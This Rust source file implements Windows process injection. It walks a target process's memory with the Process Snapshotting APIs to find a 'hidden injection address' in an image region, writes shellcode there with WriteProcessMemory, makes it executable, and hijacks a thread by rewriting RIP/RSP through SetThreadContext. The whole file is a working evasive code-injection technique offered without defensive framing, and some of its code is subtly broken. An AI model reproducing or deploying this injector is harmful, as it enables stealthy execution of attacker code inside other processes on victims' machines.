#![allow(unused_assignments)]
#![allow(unused_variables)]
#![allow(dead_code)]

// Standard library imports
use std::{
    ffi::c_void as std_c_void,
    mem::zeroed,
    ptr::null_mut,
};

// Third-party crates
use Snapshotting_rs::ProcessSnapshot;

// WinAPI imports
use winapi::{
    ctypes::c_void as winapi_c_void,
    shared::{
        minwindef::{DWORD, FALSE},
        winerror::ERROR_SUCCESS,
    },
    um::{
        debugapi::DebugActiveProcessStop,
        heapapi::{GetProcessHeap, HeapAlloc, HeapFree},
        memoryapi::{ReadProcessMemory, VirtualProtectEx, WriteProcessMemory},
        processthreadsapi::SetThreadContext,
        //winbase::{DEBUG_PROCESS, DETACHED_PROCESS, NORMAL_PRIORITY_CLASS},
        winnt::{
            CONTEXT, 
            HANDLE, 
            HEAP_ZERO_MEMORY, 
            MEMORY_BASIC_INFORMATION,
            MEM_IMAGE, 
            PAGE_EXECUTE_READ,
            PAGE_READWRITE,
        },
    },
};

// Windows-rs imports
use windows::Win32::System::Diagnostics::ProcessSnapshotting::{
    PssCaptureSnapshot,
    PssWalkMarkerCreate,
    PssWalkMarkerFree,
    PssWalkSnapshot,
    HPSS,
    HPSSWALK,
    PSS_CAPTURE_THREADS,
    PSS_CAPTURE_THREAD_CONTEXT,
    PSS_THREAD_ENTRY,
    PSS_VA_SPACE_ENTRY,
    PSS_WALK_THREADS,
    PSS_WALK_VA_SPACE,
};

pub fn get_helper(
    stack_offset: &mut usize,
    _base_address: *mut winapi_c_void,
    _shellcode_size: usize,
    stack: *mut winapi_c_void,
    size_of_image: usize,
) {
    *stack_offset = 0;
    let mut j: u32 = 0;

    while j < size_of_image as u32 {
        *stack_offset = *stack_offset + j as usize;
        let stack_val = unsafe { *((stack as *mut u8).add(j as usize) as *mut usize) };
        j = j + 1;
        if stack_val == 0 {
            *stack_offset = *stack_offset + j as usize;
            break;
        }
    }
}

pub fn capture_process_snapshot(handle: HANDLE) -> Result<ProcessSnapshot, String> {
    //println!("Capturing process...");
    //let flags: PSS_CAPTURE_FLAGS = PSS_CAPTURE_VA_CLONE | PSS_CAPTURE_VA_SPACE | PSS_CAPTURE_VA_SPACE_SECTION_INFORMATION;

    match ProcessSnapshot::new(handle) {
        Ok(snap) => {
            //println!("Process snapshot completed successfully");
            //println!("Snapshot handle: {:?}", snap);
            //println!("Snapshot will be automatically freed when it goes out of scope");
            Ok(snap)
        }
        Err(e) => Err(format!("Error capturing process snapshot: {}", e)),
    }
}

pub fn get_hidden_injection_address(
    process_handle: HANDLE,
    shellcode_size: usize,
) -> Result<*mut winapi_c_void, String> {
    let snapshot = capture_process_snapshot(process_handle)?;
    let mut shellcode_location: *mut winapi_c_void = null_mut();
    let mut walker = HPSSWALK::default();
    let pss_success = unsafe { PssWalkMarkerCreate(None, &mut walker) };

    if pss_success != ERROR_SUCCESS {
        eprintln!(
            "[!] PssWalkMarkerCreate failed: Win32 error {}",
            pss_success
        );
    } else {
        //println!("PssWalkMarkerCreate succeeded");
    }

    //println!("Walk Marker Handle: 0x{:?}", walker);

    let mut buffer = vec![0u8; std::mem::size_of::<PSS_VA_SPACE_ENTRY>()];
    let mut va_space_entry: PSS_VA_SPACE_ENTRY = unsafe { std::mem::zeroed() };

    //println!("About to start walking snapshot...");
    /*println!(
        "Snapshot handle raw: {:#x}",
        snapshot.snapshot_handle as usize
    );*/
    //println!("Walker handle raw: {:#x}", walker.0 as usize);
    let mut pss_success = unsafe {
        let result = PssWalkSnapshot(
            HPSS(snapshot.snapshot_handle as *mut std_c_void),
            PSS_WALK_VA_SPACE,
            walker,
            Some(&mut buffer),
        );
        //println!(
        //    "Initial PssWalkSnapshot result: {} (ERROR_NOT_FOUND = 1168)",
        //    result
        //);

        // Copy buffer regardless of result
        std::ptr::copy_nonoverlapping(
            buffer.as_ptr(),
            &mut va_space_entry as *mut _ as *mut u8,
            std::mem::size_of::<PSS_VA_SPACE_ENTRY>(),
        );
        result
    };

    let mut i = 0;
    while pss_success == ERROR_SUCCESS {
        //println!("\nExamining region {}:", i);
        i += 1;

        let mut mem_basic_info = unsafe { std::mem::zeroed::<MEMORY_BASIC_INFORMATION>() };
        mem_basic_info.BaseAddress = va_space_entry.BaseAddress as *mut winapi_c_void;
        mem_basic_info.AllocationBase = va_space_entry.AllocationBase as *mut winapi_c_void;
        mem_basic_info.AllocationProtect = va_space_entry.AllocationProtect;
        mem_basic_info.RegionSize = va_space_entry.RegionSize;
        mem_basic_info.State = va_space_entry.State;
        mem_basic_info.Protect = va_space_entry.Protect;
        mem_basic_info.Type = va_space_entry.Type;

        //println!("Region details:");
        //println!("  Base Address: {:p}", mem_basic_info.BaseAddress);
        //println!("  Protection: {:#x}", mem_basic_info.Protect);
        //println!("  Type: {:#x}", va_space_entry.Type);
        //println!("  Size: {}", va_space_entry.SizeOfImage);

        if mem_basic_info.Protect == 0x20 {
            //println!("Found region with correct protection");
            if va_space_entry.Type == MEM_IMAGE {
                //println!("Region is MEM_IMAGE");
                if va_space_entry.SizeOfImage > 1000000 {
                    //println!("[+] ntdll.dll captured");

                    let mut stack: *mut winapi_c_void = null_mut();
                    let mut stack_offset: usize = 0;

                    let success = unsafe {
                        ReadProcessMemory(
                            process_handle,
                            va_space_entry.ImageBase as *const winapi_c_void,
                            stack,
                            shellcode_size,
                            null_mut(),
                        )
                    };

                    let heap = unsafe { GetProcessHeap() };
                    stack = unsafe {
                        HeapAlloc(heap, HEAP_ZERO_MEMORY, mem_basic_info.RegionSize as usize)
                    };

                    if !stack.is_null() {
                        get_helper(
                            &mut stack_offset,
                            mem_basic_info.BaseAddress,
                            shellcode_size,
                            stack,
                            va_space_entry.SizeOfImage as usize,
                        );

                        //println!("Stack offset calculated: {:#x}", stack_offset);

                        shellcode_location = ((stack_offset + mem_basic_info.BaseAddress as usize)
                            - shellcode_size * 3)
                            as *mut winapi_c_void;
                        //println!("Shellcode location: {:p}", shellcode_location);

                        unsafe { HeapFree(heap, 0, stack) };
                        unsafe { PssWalkMarkerFree(walker) };
                        //println!("[+] Original base address: {:p}", mem_basic_info.BaseAddress);
                        //println!("[+] Stack offset: {:#x}", stack_offset);
                        //println!("[+] Final shellcode location: {:p}", shellcode_location);
                        return Ok(shellcode_location);
                    }
                } else {
                    //println!("Region size too small: {}", va_space_entry.SizeOfImage);
                }
            } else {
                //println!("Not MEM_IMAGE type: {:#x}", va_space_entry.Type);
            }
        }

        pss_success = unsafe {
            let result = PssWalkSnapshot(
                HPSS(snapshot.snapshot_handle as *mut std_c_void),
                PSS_WALK_VA_SPACE,
                walker,
                Some(&mut buffer),
            );
            //println!("PssWalkSnapshot result: {}", result);

            // Copy buffer regardless of result
            std::ptr::copy_nonoverlapping(
                buffer.as_ptr(),
                &mut va_space_entry as *mut _ as *mut u8,
                std::mem::size_of::<PSS_VA_SPACE_ENTRY>(),
            );
            result
        };
    }

    //println!("Finished walking snapshot. Examined {} regions", i);
    unsafe { PssWalkMarkerFree(walker) };
    Err("No suitable injection location found".to_string())
}

pub fn inject_and_rwx(
    process_handle: HANDLE,
    shellcode_location: *mut winapi_c_void,
    shellcode: &[u8],
) -> bool {
    let mut old_protect: DWORD = 0;
    let size = shellcode.len();
    let mut bytes_written: usize = 0;

    // First VirtualProtectEx call to set PAGE_READWRITE
    let success = unsafe {
        VirtualProtectEx(
            process_handle,
            shellcode_location,
            size,
            PAGE_READWRITE,
            &mut old_protect,
        )
    };

    if success == 0 {
        eprintln!("[!] [1] VirtualProtectEx FAILED with Error: {}", unsafe {
            winapi::um::errhandlingapi::GetLastError()
        });
        return false;
    }

    // WriteProcessMemory to inject shellcode
    let success = unsafe {
        WriteProcessMemory(
            process_handle,
            shellcode_location,
            shellcode.as_ptr() as *const winapi_c_void,
            size,
            &mut bytes_written,
        )
    };

    if success == 0 {
        eprintln!("[!] WriteProcessMemory FAILED with Error: {}", unsafe {
            winapi::um::errhandlingapi::GetLastError()
        });
        return false;
    }

    // Second VirtualProtectEx call to set PAGE_EXECUTE_READWRITE
    let success = unsafe {
        VirtualProtectEx(
            process_handle,
            shellcode_location,
            size,
            PAGE_EXECUTE_READ,
            &mut old_protect,
        )
    };

    if success == 0 {
        eprintln!("[!] [2] VirtualProtectEx FAILED with Error: {}", unsafe {
            winapi::um::errhandlingapi::GetLastError()
        });
        return false;
    }

    true
}

pub fn snap_thread_hijack(
    pid: DWORD,
    thread_handle: HANDLE,
    thread_id: DWORD,
    target_process: *mut winapi::ctypes::c_void,
    rip: Option<*mut winapi_c_void>,
    rsp: Option<*mut winapi_c_void>,
) -> bool {
    unsafe {
        let mut snapshot_ctx: CONTEXT = zeroed();
        let mut snapshot_handle = HPSS::default();
        let mut walk_marker_handle = HPSSWALK::default();
        let mut thread_entry: PSS_THREAD_ENTRY = zeroed();
        let mut buffer = vec![0u8; std::mem::size_of::<PSS_THREAD_ENTRY>()];

        // Capture snapshot
        let capture_flags = PSS_CAPTURE_THREADS | PSS_CAPTURE_THREAD_CONTEXT;
        let win32_handle = windows::Win32::Foundation::HANDLE(target_process as _);
        let pss_result = PssCaptureSnapshot(
            win32_handle,
            capture_flags,
            0x0010_0017,  // CONTEXT_ALL
            &mut snapshot_handle,
        );

        if pss_result != 0 {
            eprintln!("[!] PssCaptureSnapshot failed: Win32 error {}", winapi::um::errhandlingapi::GetLastError());
            return false;
        }
        //println!("[+] Snapshot captured successfully");

        // Create walk marker
        let pss_result = PssWalkMarkerCreate(None, &mut walk_marker_handle);
        if pss_result != 0 {
            eprintln!("[!] PssWalkMarkerCreate failed: Win32 error {}", winapi::um::errhandlingapi::GetLastError());
            return false;
        }
        //println!("[+] Walk marker created successfully");

        // Walk through threads
        let mut pss_result = PssWalkSnapshot(
            snapshot_handle,
            PSS_WALK_THREADS,
            walk_marker_handle,
            Some(&mut buffer),
        );

        while pss_result == 0 {
            // Copy buffer to thread_entry
            std::ptr::copy_nonoverlapping(
                buffer.as_ptr(),
                &mut thread_entry as *mut _ as *mut u8,
                std::mem::size_of::<PSS_THREAD_ENTRY>(),
            );

            if thread_entry.ThreadId == thread_id {
                // Copy context record
                if !thread_entry.ContextRecord.is_null() {
                    std::ptr::copy_nonoverlapping(
                        thread_entry.ContextRecord as *const winapi::um::winnt::CONTEXT,
                        &mut snapshot_ctx,
                        1,
                    );

                    //println!("[+] Original thread entry context record: {:p}", thread_entry.ContextRecord);
                    //println!("[+] Thread ID we're targeting: {}", thread_id);
                    //println!("[+] Process creation flags included DEBUG_PROCESS: {}", 
                    //    NORMAL_PRIORITY_CLASS | DETACHED_PROCESS | DEBUG_PROCESS);

                    //println!("[+] Snapctx.Rip Before Setting: 0x{:x}", snapshot_ctx.Rip);

                    if let Some(rip_ptr) = rip {
                        // Create a u64 with the address value instead of dereferencing
                        snapshot_ctx.Rip = rip_ptr as u64;
                        //println!("[+] Setting RIP directly to address: 0x{:x}", snapshot_ctx.Rip);
                        //println!("[+] Shellcode location (raw pointer): {:p}", rip_ptr);
                    }
                    if let Some(rsp_ptr) = rsp {
                        snapshot_ctx.Rsp = rsp_ptr as u64;
                    }

                    //println!("[+] Snapctx.Rip After Setting: 0x{:x}", snapshot_ctx.Rip);

                    //println!("[+] Setting thread context...");

                    if SetThreadContext(thread_handle, &snapshot_ctx) == FALSE {
                        eprintln!("[!] SetThreadContext FAILED with Error: {}", winapi::um::errhandlingapi::GetLastError());
                        return false;
                    }

                    std::thread::sleep(std::time::Duration::from_secs(5));
                    
                    //println!("[+] DebugActiveProcessStop...");
                    DebugActiveProcessStop(pid);
                    //println!("[+] DONE");
                    break;
                }
            }

            pss_result = PssWalkSnapshot(
                snapshot_handle,
                PSS_WALK_THREADS,
                walk_marker_handle,
                Some(&mut buffer),
            );
        }

        // Free walk marker
        let pss_result = PssWalkMarkerFree(walk_marker_handle);
        if pss_result != 0 {
            eprintln!("[!] PssWalkMarkerFree failed: Win32 error {}", winapi::um::errhandlingapi::GetLastError());
            return false;
        }

        true
    }
}